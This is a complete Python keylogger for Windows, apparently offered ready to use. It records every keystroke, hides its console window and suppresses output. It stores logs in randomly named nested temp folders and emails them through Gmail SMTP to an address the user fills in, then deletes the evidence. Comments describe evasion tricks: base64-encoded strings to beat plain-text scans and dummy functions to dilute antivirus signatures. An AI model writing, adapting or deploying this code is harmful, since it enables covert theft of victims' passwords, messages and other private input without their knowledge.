import threading
import time
from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
import email.encoders as encoders  # For base64 encoding of attachments
import ctypes
import sys
import os
import random  # For randomization to reduce patterns and generate paths
import uuid  # For generating unique random folder names

# Suppress all outputs
sys.stdout = open(os.devnull, 'w')
sys.stderr = open(os.devnull, 'w')

# Obfuscated string decoder (simple base64 for education; evades plain-text scans)
import base64
def decode_str(encoded):
    return base64.b64decode(encoded).decode('utf-8')

# Encoded strings (examples; replace with your own encoded versions)
EMAIL_SUBJECT_ENC = b'U3lzdGVtIFJlcG9ydA=='  # "System Report"

# Global data storage (renamed)
data_buffer = ""

def handle_input(event):
    """
    Processes input events to build readable text like a sentence.
    - Alphanumeric keys are appended directly.
    - Space adds a space.
    - Enter adds a newline.
    - Other special keys are appended in a readable format (e.g., [Backspace]).
    """
    global data_buffer
    try:
        data_buffer += event.char  # Append letters, numbers, symbols directly
    except AttributeError:
        if event == keyboard.Key.space:
            data_buffer += " "  # Add space for readability
        elif event == keyboard.Key.enter:
            data_buffer += "\n"  # Add newline to separate lines/paragraphs
        elif event == keyboard.Key.backspace:
            data_buffer += "[Backspace]"  # Readable label for deletions
        elif event == keyboard.Key.tab:
            data_buffer += "\t"  # Tab for indentation
        elif event == keyboard.Key.shift or event == keyboard.Key.shift_r:
            pass  # Ignore shift (handled by char case)
        else:
            data_buffer += f"[{str(event).split('.')[-1]}]"  # Readable label for other keys, e.g., [esc]

def create_random_deep_folder():
    """
    Creates a random deep folder structure in a system temp directory.
    Example: %TEMP%\random1\random2\random3\
    """
    base_dir = os.getenv('TEMP')  # Use system temp folder (e.g., C:\Users\YourUser\AppData\Local\Temp)
    deep_path = base_dir
    num_levels = random.randint(3, 5)  # Random depth between 3-5 levels
    for _ in range(num_levels):
        subfolder = str(uuid.uuid4())[:8]  # Unique random name (e.g., 'a1b2c3d4')
        deep_path = os.path.join(deep_path, subfolder)
    os.makedirs(deep_path, exist_ok=True)  # Create the folder if it doesn't exist
    return deep_path

def write_to_log_file():
    """
    Writes the current data_buffer to a log file in a random deep folder.
    Returns the full path to the log file.
    """
    deep_folder = create_random_deep_folder()
    log_file = os.path.join(deep_folder, f"log_{str(uuid.uuid4())[:8]}.txt")  # Unique log file name
    with open(log_file, "w") as f:
        f.write(data_buffer)
    return log_file

def transmit_log_file(log_file):
    """
    Emails the log file as an attachment.
    """
    sender = ""  # Your sender email
    receiver = ""  # Your receiver email
    auth = ""  # Your Gmail app password

    # Create a multipart message
    message = MIMEMultipart()
    message["Subject"] = decode_str(EMAIL_SUBJECT_ENC)
    message["From"] = sender
    message["To"] = receiver

    # Attach the log file
    try:
        with open(log_file, "rb") as attachment:
            part = MIMEBase("application", "octet-stream")
            part.set_payload(attachment.read())
        encoders.encode_base64(part)  # Encode the attachment
        part.add_header("Content-Disposition", f"attachment; filename={os.path.basename(log_file)}")
        message.attach(part)

        # Add a simple text body
        message.attach(MIMEText("Attached is the log file.", "plain"))

        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as connection:
            connection.login(sender, auth)
            connection.sendmail(sender, receiver, message.as_string())

        # Delete the log file after successful send
        os.remove(log_file)
        return True  # Success
    except Exception as e:
        # Silent handling, but you can log errors for debugging if needed
        return False

def conceal_interface():
    """
    Manages interface visibility.
    """
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass

def system_check():
    """
    Dummy function to simulate benign system checks (dilutes signature).
    """
    time.sleep(random.uniform(1, 3))  # Random delay for non-suspicious activity
    return random.randint(1, 100)  # Fake computation

def monitoring_loop():
    """
    Main monitoring routine with intervals.
    """
    try:
        monitor = keyboard.Listener(on_press=handle_input)
        monitor.start()
    except:
        sys.exit(1)
    
    while True:
        # Interval set to 60 seconds for testing; change to 300 for 5 minutes
        time.sleep(500)  # Adjust here: 60 for testing, 300 for production
        global data_buffer
        if data_buffer:  # Only process if there's data
            log_file = write_to_log_file()  # Write buffer to log file
            if transmit_log_file(log_file):  # Email if successful
                data_buffer = ""  # Clear buffer only on success
        system_check()  # Call dummy function intermittently

if __name__ == "__main__":
    conceal_interface()
    
    monitor_thread = threading.Thread(target=monitoring_loop)
    monitor_thread.daemon = True
    monitor_thread.start()
    
    try:
        while True:
            time.sleep(1)
            system_check()  # Intermittent dummy calls
    except:
        pass
